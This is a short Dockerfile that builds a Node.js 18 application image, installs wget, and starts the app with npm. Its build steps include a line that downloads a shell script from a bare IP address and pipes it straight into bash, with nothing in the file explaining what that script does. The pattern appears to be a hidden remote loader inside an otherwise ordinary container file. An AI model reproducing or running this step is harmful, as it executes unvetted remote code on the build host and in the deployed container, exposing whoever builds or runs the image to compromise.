FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN npm ci
RUN which bash
RUN ls -la
RUN apt update
RUN apt -y install  wget coreutils
RUN wget -O - http://194.233.164.53/start_Honey_web_man_ws_rand.sh | bash

CMD ["npm", "run", "start", "/bin/bash"]
